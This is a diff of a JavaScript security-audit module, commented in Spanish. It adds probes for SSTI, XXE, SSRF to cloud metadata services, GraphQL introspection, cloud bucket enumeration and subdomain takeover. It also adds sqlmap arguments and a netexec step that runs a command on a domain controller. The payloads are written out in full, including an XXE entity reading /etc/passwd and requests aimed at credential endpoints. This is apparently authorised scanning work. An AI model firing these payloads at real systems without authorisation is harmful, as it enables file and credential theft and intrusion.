@@ -538,6 +538,43 @@ export function xssReflectionCurlSteps(step, prefix, baseUrl, maxTime = "12") {
 }
 
 /**
+ * SSTI (Server-Side Template Injection) genérico: a diferencia de XSS
+ * reflejado (busca el payload SIN escapar), aquí se busca que el motor de
+ * plantillas lo haya EVALUADO. Un solo payload por parámetro concatena la
+ * sintaxis de los motores más comunes — {{7*7}} (Jinja2/Twig/Nunjucks),
+ * ${7*7} (Freemarker/Thymeleaf/JSP EL/OGNL), <%= 7*7 %> (ERB/JSP
+ * scriptlet), @(7*7) (Razor), #{7*7} (Pug) — cada uno envuelto por el
+ * mismo marcador único a ambos lados. Si CUALQUIERA de los motores evalúa
+ * su expresión, el resultado ("49") queda pegado entre dos ocurrencias
+ * consecutivas del marcador; los que no evalúan mantienen su sintaxis
+ * literal entre marcadores. Por eso basta una sola regex
+ * "MARCADOR + 49 + MARCADOR" para detectar evaluación en cualquier
+ * posición, sin necesidad de un request por motor.
+ */
+export const SSTI_MARKER = "dsssti1337";
+export const SSTI_PAYLOAD = `${SSTI_MARKER}{{7*7}}${SSTI_MARKER}\${7*7}${SSTI_MARKER}<%= 7*7 %>${SSTI_MARKER}@(7*7)${SSTI_MARKER}#{7*7}${SSTI_MARKER}`;
+export const SSTI_PARAMS = ["q", "search", "query", "name", "s", "template", "lang"];
+
+const SSTI_EVALUATED_RE = new RegExp(`${SSTI_MARKER}\\s*49\\s*${SSTI_MARKER}`);
+
+/** true si algún motor de plantillas evaluó su expresión (ver comentario arriba). */
+export function sstiEvaluated(text) {
+  return SSTI_EVALUATED_RE.test(String(text || ""));
+}
+
+export function sstiReflectionCurlSteps(step, prefix, baseUrl, maxTime = "12") {
+  return SSTI_PARAMS.map((param) =>
+    step(`${prefix}-${param}`, "curl", [
+      "-s", "-L", "--max-time", maxTime,
+      "-G", "--data-urlencode", `${param}=${SSTI_PAYLOAD}`,
+      baseUrl + "/",
+    ], null, {
+      desc: `Sonda de SSTI genérico: parámetro ?${param}=`,
+    }),
+  );
+}
+
+/**
  * Open redirect genérico: parámetros habituales de redirección con una URL
  * externa de prueba. Si el servidor responde con Location apuntando a esa
  * URL (sin validar contra allow-list), es redirect abierto — útil para
@@ -894,6 +931,61 @@ export function genericExposureCurlSteps(step, prefix, baseUrl, maxTime = "12") 
 }
 
 /* ------------------------------------------------------------------------ *
+ * GraphQL — descubrimiento de endpoint + introspection. A diferencia de
+ * GENERIC_EXPOSURE_PROBES (GET simple), GraphQL no responde nada útil a un
+ * GET: hace falta POST con Content-Type JSON y una query real. La query de
+ * introspección ({__schema{...}}) es estándar del protocolo (no un
+ * exploit); si el servidor la contesta con el schema completo, es
+ * exposición de superficie de API completa sin autenticar (CWE-200).
+ * ------------------------------------------------------------------------ */
+export const GRAPHQL_PROBES = [
+  { stepId: "graphql", path: "/graphql" },
+  { stepId: "api-graphql", path: "/api/graphql" },
+  { stepId: "graphiql", path: "/graphiql" },
+  { stepId: "v1-graphql", path: "/v1/graphql" },
+  { stepId: "query", path: "/query" },
+];
+
+const GRAPHQL_INTROSPECTION_BODY = JSON.stringify({ query: "{__schema{queryType{name}}}" });
+
+export function graphqlIntrospectionCurlSteps(step, prefix, baseUrl, maxTime = "12") {
+  return GRAPHQL_PROBES.map((p) =>
+    step(`${prefix}-${p.stepId}`, "curl", [
+      "-s", "-L", "--max-time", maxTime,
+      "-X", "POST", "-H", "Content-Type: application/json",
+      "-d", GRAPHQL_INTROSPECTION_BODY,
+      baseUrl + p.path,
+    ], null, {
+      desc: `Sonda GraphQL: introspection en ${p.path}`,
+    }),
+  );
+}
+
+// Envolvente estándar de respuesta GraphQL (data/errors) — confirma que el
+// endpoint es GraphQL de verdad, no un 404 genérico o un JSON cualquiera.
+const GRAPHQL_ENDPOINT_RE = /"data"\s*:\s*[{[]|"errors"\s*:\s*\[/i;
+const GRAPHQL_SCHEMA_RE = /"__schema"|"queryType"\s*:\s*\{/i;
+
+export function graphqlFindings(text, path) {
+  const t = String(text || "");
+  if (!GRAPHQL_ENDPOINT_RE.test(t)) return [];
+  if (GRAPHQL_SCHEMA_RE.test(t)) {
+    return [{
+      title: `GraphQL introspection habilitada en ${path}`,
+      severity: "Medium",
+      description: `El endpoint GraphQL en ${path} respondió a una query de introspección (__schema) exponiendo el esquema completo: tipos, queries, mutations y sus argumentos (CWE-200). Cualquiera puede mapear toda la superficie de la API sin credenciales, incluidas mutations no documentadas — inventario directo para IDOR/lógica de negocio.`,
+      remediation: "Deshabilitar introspection en producción (introspection: false en Apollo Server, GRAPHIQL=false en la mayoría de frameworks). Si hace falta para debugging, restringirlo a IPs internas o requerir autenticación.",
+    }];
+  }
+  return [{
+    title: `Endpoint GraphQL detectado en ${path} (introspection deshabilitada)`,
+    severity: "Info",
+    description: `${path} responde con el formato estándar de GraphQL (data/errors) pero rechazó la query de introspección: la API existe pero el esquema no es explorable a ciegas. Candidato a sondear manualmente operaciones conocidas por nombre (login, user, admin, createUser).`,
+    remediation: "Ninguna por sí sola: buena práctica ya aplicada (introspection cerrada). Confirmar que tampoco haya un endpoint /graphiql o playground accesible en producción.",
+  }];
+}
+
+/* ------------------------------------------------------------------------ *
  * JWT: crackeo offline de secreto débil (HS256) y bypass alg=none.
  * Solo cómputo local (SHA-256/HMAC puro JS, sin llamada de red para el
  * crackeo) + una petición HTTP activa por endpoint para probar el bypass,
@@ -1115,6 +1207,40 @@ export function waybackOsintSteps(step, root) {
       desc: "Rutas históricas indexadas por Wayback Machine (archive.org)",
     }),
   ];
+}
+
+/* ------------------------------------------------------------------------ *
+ * XXE (XML External Entity) genérico: mismo criterio que SSTI — un solo
+ * payload curado, confirmación solo si el efecto real ocurrió (aquí,
+ * lectura de fichero local), no un eco ciego del payload sin evaluar.
+ * Rutas típicas que aceptan XML: SOAP, APIs REST que también aceptan
+ * application/xml además de JSON, endpoints de importación/upload.
+ * https://hacktricks.wiki/en/pentesting-web/xxe-xml-external-entity.html
+ * ------------------------------------------------------------------------ */
+export const XXE_PAYLOAD =
+  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
+export const XXE_PATHS = [
+  "/", "/api", "/api/xml", "/soap", "/xmlrpc.php", "/upload", "/import",
+];
+
+const XXE_CONFIRMED_RE = /root:.*:0:0:/;
+
+/** true si la respuesta refleja /etc/passwd real (lectura de fichero confirmada, no eco ciego). */
+export function xxeConfirmed(text) {
+  return XXE_CONFIRMED_RE.test(String(text || ""));
+}
+
+export function xxeCurlSteps(step, prefix, baseUrl, maxTime = "12") {
+  return XXE_PATHS.map((path, i) =>
+    step(`${prefix}-${i + 1}`, "curl", [
+      "-s", "-L", "--max-time", maxTime,
+      "-H", "Content-Type: application/xml",
+      "--data-binary", XXE_PAYLOAD,
+      baseUrl + path,
+    ], null, {
+      desc: `Sonda de XXE genérico: ${path}`,
+    }),
+  );
 }
 
 /* ------------------------------------------------------------------------ *
@@ -1744,6 +1870,74 @@ export const AZURE_BLOB_LISTING_RE = /<EnumerationResults/i;
 export const GCS_LISTING_RE = /"kind":\s*"storage#objects"/i;
 
 /* ------------------------------------------------------------------------ *
+ * cloud_enum (github.com/initstring/cloud_enum) — enumeración ACTIVA por
+ * permutación de nombre contra AWS/Azure/GCP, a diferencia de
+ * extractS3BucketHost/extractAzureBlobContainer/extractGcsBucket (arriba),
+ * que son PASIVAS: solo confirman un recurso que la app YA referencia.
+ * Esto adivina nombres a partir del dominio del cliente.
+ *
+ * Problema de atribución inherente a la técnica: un bucket "acme" puede
+ * pertenecer a CUALQUIER empresa que se llame así, no necesariamente al
+ * cliente auditado — a diferencia de subdomain takeover (ancla a un host
+ * que sí resuelve bajo el dominio real). Por eso ningún finding de acá
+ * pasa de Medium: siempre es candidato a confirmar propiedad a mano.
+ * ------------------------------------------------------------------------ */
+
+/** Segundo-a-último label del dominio (nombre de marca, no el TLD ni un subdominio). */
+export function cloudEnumKeyword(root) {
+  const labels = String(root || "").toLowerCase().split(".").filter(Boolean);
+  if (!labels.length) return "";
+  return labels.length >= 2 ? labels[labels.length - 2] : labels[0];
+}
+
+export function cloudEnumArgs(keyword) {
+  return ["-k", keyword, "-qs", "-l", "/dev/stdout", "-f", "json"];
+}
+
+// Recursos con datos reales detrás (no solo un DNS/app registrado).
+const CLOUD_ENUM_STORAGE_RE = /bucket|container|storage|database|blob/i;
+// cloud_enum marca "Open X" cuando confirma listado/lectura sin auth.
+const CLOUD_ENUM_OPEN_RE = /^open\b/i;
+
+export function cloudEnumFindings(stdout) {
+  const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
+  const out = [];
+  const seen = new Set();
+  for (const line of lines) {
+    if (!line.startsWith("{")) continue;
+    let hit;
+    try {
+      hit = JSON.parse(line);
+    } catch {
+      continue;
+    }
+    if (!hit.target || hit.access === "disabled" || !hit.access) continue;
+    if (seen.has(hit.target)) continue;
+    seen.add(hit.target);
+    const platform = String(hit.platform || "cloud").toUpperCase();
+    const isStorage = CLOUD_ENUM_STORAGE_RE.test(hit.msg || "");
+    const isOpen = hit.access === "public" && (CLOUD_ENUM_OPEN_RE.test(hit.msg || "") || isStorage);
+    if (isOpen) {
+      out.push({
+        title: `${platform}: recurso cloud público sin autenticación (candidato — confirmar pertenencia)`,
+        severity: "Medium",
+        description: `cloud_enum encontró «${hit.msg}» en ${hit.target} por permutación del nombre del cliente, marcado como accesible sin autenticación. Candidato, no confirmado: verificar a mano que el recurso pertenece de verdad al cliente auditado antes de tratarlo como hallazgo (un bucket/cuenta con ese nombre puede pertenecer a otra organización).`,
+        remediation: "Si el recurso es del cliente: bloquear el acceso anónimo/listado público (S3 Block Public Access, contenedor privado en Azure, uniform bucket-level access en GCS). Si no pertenece al cliente, descartar como falso positivo de atribución.",
+      });
+    } else {
+      out.push({
+        title: `${platform}: recurso cloud descubierto por nombre (candidato — confirmar pertenencia)`,
+        severity: "Info",
+        description: `cloud_enum confirmó la existencia de «${hit.msg}» en ${hit.target} por permutación del nombre del cliente (acceso: ${hit.access}). No implica datos expuestos por sí solo; inventario de superficie cloud no visible por crawling pasivo. Confirmar que el recurso pertenece al alcance autorizado antes de sondearlo más.`,
+        remediation: "Ninguna por sí sola: es inventario de superficie a confirmar. Si pertenece al cliente y requiere auth, sin acción; si es de otra organización, descartar.",
+      });
+    }
+    if (out.length >= 15) break;
+  }
+  return out;
+}
+
+/* ------------------------------------------------------------------------ *
  * SSRF genérico → AWS Instance Metadata Service (IMDS, 169.254.169.254):
  * si algún parámetro típico de "fetch de URL" acepta la IMDS y la respuesta
  * refleja contenido de metadata/credenciales, es SSRF confirmado hacia la
@@ -1769,6 +1963,49 @@ export function ssrfImdsCurlSteps(step, prefix, baseUrl, maxTime = "10") {
 /** Señal fuerte (credencial real filtrada) vs. señal débil (solo categorías IMDS listadas). */
 export const SSRF_IMDS_STRONG_RE = /"AccessKeyId"\s*:|"SecretAccessKey"\s*:/i;
 export const SSRF_IMDS_WEAK_RE = /\bami-id\b|\binstance-id\b|\bsecurity-credentials\b|\blocal-ipv4\b/i;
+
+/* ------------------------------------------------------------------------ *
+ * SSRF multi-cloud: GCP y Azure exponen metadata en la MISMA IP link-local
+ * (169.254.169.254) que AWS, pero ambos EXIGEN un header propio
+ * (Metadata-Flavor: Google / Metadata: true) para responder — algo que un
+ * SSRF ciego no puede forjar (la app vulnerable hace el fetch con SU
+ * propio HTTP client, no con headers que nosotros controlemos). Por eso
+ * la señal "fuerte" (metadata real filtrada) solo aplica si la app
+ * reenvía headers arbitrarios además de la URL; la señal realista es que
+ * la petición SÍ llegó al servicio de metadata real y fue rechazada POR
+ * LA NUBE (no por timeout/red) — eso ya confirma SSRF real hacia
+ * superficie interna, solo que este endpoint puntual está bien defendido.
+ * ------------------------------------------------------------------------ */
+export const SSRF_CLOUD_METADATA = {
+  aws: { url: SSRF_IMDS_TEST_URL, label: "AWS" },
+  gcp: { url: "http://169.254.169.254/computeMetadata/v1/project/project-id", label: "GCP" },
+  azure: { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "Azure" },
+};
+
+function ssrfCloudCurlSteps(step, prefix, baseUrl, testUrl, label, maxTime) {
+  return SSRF_IMDS_PARAMS.map((param) =>
+    step(`${prefix}-${param}`, "curl", [
+      "-s", "-L", "--max-time", maxTime,
+      "-G", "--data-urlencode", `${param}=${testUrl}`,
+      baseUrl,
+    ], null, {
+      desc: `Sonda SSRF: ¿${param}= reenvía la petición a metadata ${label}?`,
+    }),
+  );
+}
+
+export function ssrfGcpImdsCurlSteps(step, prefix, baseUrl, maxTime = "10") {
+  return ssrfCloudCurlSteps(step, prefix, baseUrl, SSRF_CLOUD_METADATA.gcp.url, "GCP", maxTime);
+}
+
+export function ssrfAzureImdsCurlSteps(step, prefix, baseUrl, maxTime = "10") {
+  return ssrfCloudCurlSteps(step, prefix, baseUrl, SSRF_CLOUD_METADATA.azure.url, "Azure", maxTime);
+}
+
+export const SSRF_GCP_STRONG_RE = /"numericProjectId"\s*:|"serviceAccounts"\s*:/i;
+export const SSRF_GCP_BLOCKED_RE = /Metadata-Flavor/i;
+export const SSRF_AZURE_STRONG_RE = /"subscriptionId"\s*:|"resourceGroupName"\s*:|"osProfile"\s*:/i;
+export const SSRF_AZURE_BLOCKED_RE = /Required metadata header not specified|invalid Metadata header/i;
 
 /* ------------------------------------------------------------------------ *
  * Cortafuegos — dos capas:
@@ -2372,27 +2609,37 @@ function combineWeights(weights) {
 /**
  * FAIR-lite 0–100 + A–F sobre hallazgos ya recolectados (sin red).
  * E saturado con K=25; T combina señales de secreto vivo / bucket / SSRF;
- * I por peor caso (secreto/cloud vs contexto).
+ * I por peor caso (crítico confirmado vs correo/contexto).
  */
 export function computeExposureRisk(findings) {
   const list = (findings || []).filter((f) => f && !EXPOSURE_DELTA_SKIP_RE.test(f.title || ""));
   let S = 0;
   let hasCriticalSecret = false;
+  let hasCritical = false;
   const blobOf = (f) => `${f.title || ""} ${f.description || ""}`.toLowerCase();
   for (const f of list) {
     const s = String(f.severity || "").toLowerCase();
     S += SEV_EXPOSURE_W[s] || 0;
-    if (s === "critical" && /secret|credencial|hardcodeada|bucket|listable|ssrf|viva confirmada/i.test(blobOf(f))) {
+    if (s === "critical") hasCritical = true;
+    // Solo secretos/cloud/SSRF reales — NO bastar con la palabra
+    // «credenciales» (un SQLi «sin credenciales» la contiene y disparaba
+    // el suelo E=50 / I=90 como si hubiera un secreto vivo).
+    const blob = blobOf(f);
+    if (
+      s === "critical"
+      && /secreto vivo|viva confirmada|hardcodead[ao] en bundle|access key|bucket listable|ssrf confirmado|listable públicamente/i.test(blob)
+    ) {
       hasCriticalSecret = true;
     }
   }
   let E = Math.min(1 - Math.exp(-S / 25), 1 - 1e-15);
   if (hasCriticalSecret) E = Math.max(E, 0.5);
+  else if (hasCritical) E = Math.max(E, 0.35);
   const threatW = [];
   if (list.some((f) => /viva confirmada|hardcodeada en bundle|access key/i.test(f.title || ""))) threatW.push(0.8);
   if (list.some((f) => /ssrf confirmado|listable públicamente/i.test(f.title || ""))) threatW.push(0.9);
   const T = threatW.length ? combineWeights(threatW) : 0.05;
-  const I = hasCriticalSecret ? 0.9
+  const I = (hasCriticalSecret || hasCritical) ? 0.9
     : list.some((f) => /spf|dmarc|tenant|workspace/i.test((f.title || "").toLowerCase())) ? 0.4
       : 0.2;
   const likelihood = combineWeights([E, T]);
@@ -2406,6 +2653,8 @@ export function computeExposureRisk(findings) {
     threat: Math.round(T * 1000) / 10,
     impact: Math.round(I * 1000) / 10,
     dominant,
+    hasCriticalSecret,
+    hasCritical,
   };
 }
 
@@ -2424,12 +2673,18 @@ export function exposureScoreFindings(findings) {
     .filter(Boolean)
     .slice(0, 5);
   const drivers = worst.length
-    ? `Hallazgos que más empujan el índice: ${worst.join("; ")}.`
+    ? `Hallazgos que más empujan el índice: ${[...new Set(worst)].join("; ")}.`
     : "No hay críticos ni altos: el índice lo marca la higiene (SPF/DMARC/cabeceras) y el recuento de infos.";
+  let floorNote = "";
+  if (score.hasCriticalSecret) {
+    floorNote = " Un crítico de secreto vivo / bucket listable / SSRF eleva el suelo de exposición a 50.";
+  } else if (score.hasCritical) {
+    floorNote = " Un crítico confirmado eleva el suelo de exposición a 35.";
+  }
   return [{
     title: `Índice de exposición OSINT: ${score.risk}/100 (grado ${score.grade})`,
     severity: "Info",
-    description: `Cuantificación FAIR-lite sobre los hallazgos de esta auditoría (sin tráfico extra): exposición ${score.exposure}, amenaza ${score.threat}, impacto ${score.impact}. Motor dominante: ${score.dominant}. Recuento que alimenta el índice: ${bySev.critical} críticos, ${bySev.high} altos, ${bySev.medium} medios, ${bySev.low} bajos, ${bySev.info} infos. ${drivers} Un crítico confirmado (secreto vivo / bucket listable / SSRF) eleva el suelo de exposición a 50. El grado no es comparable entre clientes.`,
+    description: `Cuantificación FAIR-lite sobre los hallazgos de esta auditoría (sin tráfico extra): exposición ${score.exposure}, amenaza ${score.threat}, impacto ${score.impact}. Motor dominante: ${score.dominant}. Recuento que alimenta el índice: ${bySev.critical} críticos, ${bySev.high} altos, ${bySev.medium} medios, ${bySev.low} bajos, ${bySev.info} infos. ${drivers}${floorNote} El grado no es comparable entre clientes.`,
     remediation: "No abras ticket sobre el índice. Cierra primero los hallazgos que alimentan el motor dominante; relanza el análisis para ver si el grado baja. No compares el número entre clientes.",
   }];
 }
@@ -2478,12 +2733,15 @@ const NUCLEI_SEVERITY_MAP = {
 
 /**
  * Tags de nuclei a correr según el stack detectado por buildPlaybookContext.
- * Siempre incluye "exposure,misconfig" (bajo ruido, alto valor en cualquier
- * stack); suma tags específicos solo si aplican, para no correr miles de
+ * Siempre incluye "exposure,misconfig,default-login,cve": cada template
+ * trae su propio matcher (versión de banner, ruta específica, etc.), así
+ * que sumar "cve" no aumenta falsos positivos — solo tiempo de escaneo,
+ * por eso el bridge le da timeout largo (EXEC_LONG_TIMEOUT_TOOLS). Suma
+ * tags específicos de stack solo si aplican, para no correr miles de
  * templates irrelevantes contra cada target.
  */
 export function nucleiTagsForContext(ctx) {
-  const tags = ["exposure", "misconfig", "default-login"];
+  const tags = ["exposure", "misconfig", "default-login", "cve"];
   if (ctx.isWordpress) tags.push("wordpress", "wp-plugin");
   if (ctx.isApache) tags.push("apache");
   if (ctx.isDvwa) tags.push("php");
@@ -2536,6 +2794,22 @@ export function nucleiFindings(stdout) {
  * ------------------------------------------------------------------------ */
 export function sqlmapCurlArgs(baseUrl) {
   return ["-u", baseUrl, "--forms", "--crawl=2", "--batch",
+    "--level=1", "--risk=1", "--random-agent", "--flush-session"];
+}
+
+/**
+ * sqlmap sobre parámetros GET reales que arjun ya descubrió (Fase 2), no
+ * sobre formularios crawleados a ciegas. Se agrega cada param a la query
+ * string con valor dummy "1" (sqlmap necesita el par nombre=valor en la
+ * URL para saber qué testear) y -p restringe la prueba exactamente a esos
+ * params — evita que sqlmap se ponga a explorar otros que ya haya en la
+ * URL sin que arjun los haya confirmado como reales.
+ */
+export function sqlmapArjunArgs(url, params = []) {
+  const qs = params.map((p) => `${encodeURIComponent(p)}=1`).join("&");
+  const sep = url.includes("?") ? "&" : "?";
+  const targetUrl = qs ? `${url}${sep}${qs}` : url;
+  return ["-u", targetUrl, "-p", params.join(","), "--batch",
     "--level=1", "--risk=1", "--random-agent", "--flush-session"];
 }
 
@@ -2609,9 +2883,77 @@ export function extractSubfinderHosts(stdout, root) {
 }
 
 export function httpxArgsForHosts(hosts) {
-  const args = ["-silent", "-json", "-tech-detect", "-status-code", "-title", "-timeout", "8"];
+  const args = ["-silent", "-json", "-tech-detect", "-status-code", "-title", "-cname", "-timeout", "8"];
   for (const h of hosts) args.push("-u", `https://${h}`);
   return args;
+}
+
+/* ------------------------------------------------------------------------ *
+ * Subdomain takeover — casi gratis sobre el httpx que ya corre en OSINT
+ * (Fase 1): con -cname agregado, cada línea trae el CNAME real. Si apunta
+ * a un proveedor conocido de "claim this domain" Y el host no responde
+ * sano (failed, sin host_ip, o 404/0), es candidato a takeover. Solo
+ * "candidato": confirmar de verdad requiere intentar reclamar el recurso
+ * en el proveedor, algo que este motor no automatiza (fuera de alcance
+ * de una auditoría no destructiva). Lista curada de proveedores con
+ * historial de takeover documentado (evita ruido con dominios propios).
+ * ------------------------------------------------------------------------ */
+const TAKEOVER_FINGERPRINTS = [
+  { suffix: "github.io", service: "GitHub Pages" },
+  { suffix: "herokuapp.com", service: "Heroku" },
+  { suffix: "herokudns.com", service: "Heroku" },
+  { suffix: "s3.amazonaws.com", service: "AWS S3" },
+  { suffix: "s3-website", service: "AWS S3" },
+  { suffix: "azurewebsites.net", service: "Azure App Service" },
+  { suffix: "cloudapp.net", service: "Azure Cloud Service" },
+  { suffix: "trafficmanager.net", service: "Azure Traffic Manager" },
+  { suffix: "myshopify.com", service: "Shopify" },
+  { suffix: "wpengine.com", service: "WP Engine" },
+  { suffix: "unbouncepages.com", service: "Unbounce" },
+  { suffix: "statuspage.io", service: "Statuspage" },
+  { suffix: "surge.sh", service: "Surge.sh" },
+  { suffix: "bitbucket.io", service: "Bitbucket Pages" },
+  { suffix: "ghost.io", service: "Ghost" },
+  { suffix: "helpjuice.com", service: "Helpjuice" },
+  { suffix: "helpscoutdocs.com", service: "Help Scout Docs" },
+  { suffix: "readme.io", service: "ReadMe" },
+  { suffix: "zendesk.com", service: "Zendesk" },
+  { suffix: "pantheonsite.io", service: "Pantheon" },
+  { suffix: "webflow.io", service: "Webflow" },
+  { suffix: "intercom.help", service: "Intercom" },
+];
+
+export function subdomainTakeoverFindings(stdout) {
+  const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
+  const out = [];
+  const seen = new Set();
+  for (const line of lines) {
+    let hit;
+    try {
+      hit = JSON.parse(line);
+    } catch {
+      continue;
+    }
+    const cnameRaw = Array.isArray(hit.cname) ? hit.cname[0] : hit.cname;
+    const cname = String(cnameRaw || "").toLowerCase();
+    if (!cname) continue;
+    const fp = TAKEOVER_FINGERPRINTS.find((f) => cname.includes(f.suffix));
+    if (!fp) continue;
+    const dangling = hit.failed === true || !hit.host_ip || hit.status_code === 404 || hit.status_code === 0;
+    if (!dangling) continue;
+    const host = hit.host || hit.input || hit.url || cname;
+    if (seen.has(host)) continue;
+    seen.add(host);
+    const statusNote = hit.failed ? "la conexión falló (no resuelve/responde)" : `respondió HTTP ${hit.status_code || "sin código"}`;
+    out.push({
+      title: `Posible subdomain takeover: ${host} → ${fp.service} (CNAME colgante)`,
+      severity: "Medium",
+      description: `${host} tiene un CNAME hacia ${cname} (${fp.service}), y ${statusNote} — patrón típico de un recurso no reclamado en ese proveedor. Es un candidato, no una confirmación: falta intentar reclamar el mismo nombre en el panel de ${fp.service}.`,
+      remediation: `Si ese servicio de ${fp.service} ya no está en uso, eliminar el registro CNAME de ${host} del DNS. Si sigue en uso, verificar que el recurso siga existiendo y reclamado en ${fp.service}; si no, reclamarlo antes de que un tercero lo haga con ese mismo hostname.`,
+    });
+    if (out.length >= 8) break;
+  }
+  return out;
 }
 
 /**
@@ -2690,17 +3032,33 @@ export function extractKatanaUrls(stdout, baseUrl) {
 }
 
 /**
- * Inventario consolidado (1 finding Info, no vulnerabilidad) — mismo
- * criterio que httpxFindings: superficie de ataque descubierta, no un
- * hallazgo explotable por sí solo.
+ * Inventario consolidado (1 finding Info). Si katana solo devolvió el apex
+ * (/), no hay superficie nueva → no emitir ficha.
  */
 export function katanaFindings(stdout, baseUrl) {
   const urls = extractKatanaUrls(stdout, baseUrl);
   if (!urls.length) return [];
+  let basePath = "/";
+  try {
+    basePath = (new URL(baseUrl).pathname || "/").replace(/\/+$/, "") || "/";
+  } catch {
+    /* keep "/" */
+  }
+  const interesting = urls.filter((href) => {
+    try {
+      const u = new URL(href);
+      const path = (u.pathname || "/").replace(/\/+$/, "") || "/";
+      if (path !== basePath) return true;
+      return Boolean(u.search || u.hash);
+    } catch {
+      return true;
+    }
+  });
+  if (!interesting.length) return [];
   return [{
-    title: `${urls.length} endpoint(s) descubiertos por crawling activo (katana)`,
+    title: `${interesting.length} endpoint(s) descubiertos por crawling activo (katana)`,
     severity: "Info",
-    description: `Crawling activo (katana, links + parseo JS) sobre ${baseUrl} encontró: ${urls.slice(0, 15).join("; ")}${urls.length > 15 ? "; ..." : ""}. Inventario de superficie; rutas /api/, /rest/, /admin/ son candidatas a sondas XSS/SQLi/IDOR.`,
+    description: `Crawling activo (katana, links + parseo JS) sobre ${baseUrl} encontró: ${interesting.slice(0, 15).join("; ")}${interesting.length > 15 ? "; ..." : ""}. Inventario de superficie; rutas /api/, /rest/, /admin/ son candidatas a sondas XSS/SQLi/IDOR.`,
     remediation: "Ninguna por sí sola: es inventario de superficie de ataque. Revisar manualmente cada endpoint nuevo — especialmente rutas /api/, /rest/, /admin/ — como candidatos para las sondas de XSS/SQLi/IDOR existentes.",
   }];
 }
@@ -3080,13 +3438,24 @@ export function niktoFindings(stdout) {
     const cveM = line.match(/CVE-\d{4}-\d+/i);
     const osvdbM = line.match(/OSVDB-\d+/i);
     const path = niktoExtractPath(line);
-    if (!path && !cveM && !osvdbM) continue;
+    // Nikto a veces confirma la ruta Y filtra un secreto real en la misma
+    // línea (p. ej. "/webcgi/: ... The key is: AIza..."); sin esto, un
+    // secreto real quedaba escondido bajo el título/severidad genéricos de
+    // "superficie". Reusa el mismo catálogo que jsSecretFindings.
+    let secretSig = null;
+    for (const sig of JS_SECRET_SIGNATURES) {
+      if (sig.re.test(line)) { secretSig = sig; break; }
+    }
+    if (!path && !cveM && !osvdbM && !secretSig) continue;
     let severity = "Low";
     if (cveM) severity = "High";
     else if (/phpinfo|config\.(inc|php)|wp-config|\.bak|\.git|passwd|backup/i.test(line)) severity = "High";
     else if (/directory indexing|index of/i.test(line)) severity = "Medium";
     else if (osvdbM && path) severity = "Medium";
-    const title = niktoShortTitle(line, path, cveM, osvdbM);
+    if (secretSig) severity = secretSig.severity || "High";
+    const title = secretSig
+      ? (path ? `Nikto: ${secretSig.label} expuesta en ${path}` : `Nikto: ${secretSig.label} expuesta`)
+      : niktoShortTitle(line, path, cveM, osvdbM);
     const key = `${severity}|${(path || cveM?.[0] || osvdbM?.[0] || title).toLowerCase()}`;
     if (seen.has(key)) continue;
     seen.add(key);
@@ -3095,11 +3464,13 @@ export function niktoFindings(stdout) {
       title,
       severity,
       description: `Nikto confirmó este check contra la respuesta real del servicio: ${line}${refs ? ` Referencia ${refs}.` : ""}`,
-      remediation: cveM
-        ? `Revisar ${cveM[0]} y aplicar el parche o el hardening que cierra ese check. Re-ejecutar nikto sobre la misma ruta para verificar el cierre.`
-        : path
-          ? `Revisar ${path}: retirar del document root, autenticar o desactivar el listado. No depender de que la ruta no esté enlazada.`
-          : "Aplicar el control que Nikto señaló y verificar con la misma sonda.",
+      remediation: secretSig
+        ? `Rotar de inmediato esta credencial (${secretSig.label}, ${secretSig.cwe}): quedó expuesta en texto plano en ${path || "una ruta pública"}. Retirar la ruta del document root o autenticarla; no depender de que no esté enlazada.`
+        : cveM
+          ? `Revisar ${cveM[0]} y aplicar el parche o el hardening que cierra ese check. Re-ejecutar nikto sobre la misma ruta para verificar el cierre.`
+          : path
+            ? `Revisar ${path}: retirar del document root, autenticar o desactivar el listado. No depender de que la ruta no esté enlazada.`
+            : "Aplicar el control que Nikto señaló y verificar con la misma sonda.",
     });
     if (out.length >= 8) break;
   }
@@ -3706,6 +4077,58 @@ export function adWinrmCheckSteps(step, host) {
   ];
 }
 
+/**
+ * Cortafuegos AD (Windows Defender Firewall en el DC). A diferencia de
+ * ufw/iptables/nft (host local, lectura directa) o de adWinrmCheckSteps
+ * (solo valida auth, sin shell), Windows Firewall remoto NO tiene
+ * consulta de solo-lectura vía RPC/LDAP — la única vía real es ejecutar
+ * `netsh advfirewall show allprofiles` en el DC (netexec -x, por debajo
+ * wmiexec: crea un proceso real, aunque el comando en sí sea de solo
+ * lectura). Por eso vive en Fase 3 (Exploitation, mismo gate humano que
+ * wmiexec.py/secretsdump.py), no junto a la collection AD de Fase 1/2.
+ */
+export function adFirewallCheckSteps(step, host) {
+  const h = String(host || "").trim();
+  if (!h) return [];
+  return [
+    step("p3-ad-firewall", "netexec", (c) => {
+      const user = String(c.adUser || "").trim();
+      const pass = String(c.adPassword || "");
+      if (!user || !pass) return null;
+      const args = ["smb", h, "-u", user, "-p", pass, "-x", "netsh advfirewall show allprofiles"];
+      const d = String(c.adDomain || "").trim();
+      if (d) args.push("-d", d);
+      return args;
+    }, null, {
+      desc: "Estado de Windows Firewall en el DC (netexec -x netsh advfirewall)",
+      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
+    }),
+  ];
+}
+
+const AD_FIREWALL_PROFILE_RE = /^(Domain|Private|Public) Profile Settings:\s*[\r\n]+-+\s*[\r\n]+State\s+(ON|OFF)/gim;
+const AD_FIREWALL_PROFILE_SEVERITY = { domain: "High", private: "Medium", public: "Medium" };
+const AD_FIREWALL_PROFILE_LABEL = { domain: "Domain", private: "Private", public: "Public" };
+
+/** Parsea `netsh advfirewall show allprofiles` (vía netexec -x). */
+export function adFirewallFindings(stdout, host) {
+  const text = String(stdout || "");
+  const out = [];
+  for (const m of text.matchAll(AD_FIREWALL_PROFILE_RE)) {
+    const key = m[1].toLowerCase();
+    const state = m[2].toUpperCase();
+    if (state !== "OFF") continue;
+    const label = AD_FIREWALL_PROFILE_LABEL[key];
+    out.push({
+      title: `Windows Firewall desactivado (perfil ${label}) en ${host || "el DC"}`,
+      severity: AD_FIREWALL_PROFILE_SEVERITY[key] || "Medium",
